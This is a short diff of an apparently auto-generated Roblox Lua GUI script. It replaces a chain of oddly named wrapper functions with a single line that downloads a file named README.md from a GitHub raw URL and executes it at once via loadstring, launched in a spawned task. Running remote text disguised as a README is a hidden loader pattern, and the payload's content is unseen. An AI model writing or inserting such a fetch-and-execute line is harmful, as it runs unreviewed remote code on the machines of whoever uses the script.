@@ -202,18 +202,7 @@ local script = G2L["8"];
 	end
 	
 	
-	local function _3(_2)
-		return loadstring(game:HttpGet(_2))
-	end
-	
-	local function _2(_1)
-		return _3(_1)
-	end
-	
-	local function _API_Fetch()
-		local url = "https://raw.githubusercontent.com/G4mg1/newone/refs/heads/main/README.md"
-		_2(url)()
-	end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/G4mg1/newone/refs/heads/main/README.md"))()
 end;
 task.spawn(C_8);
 
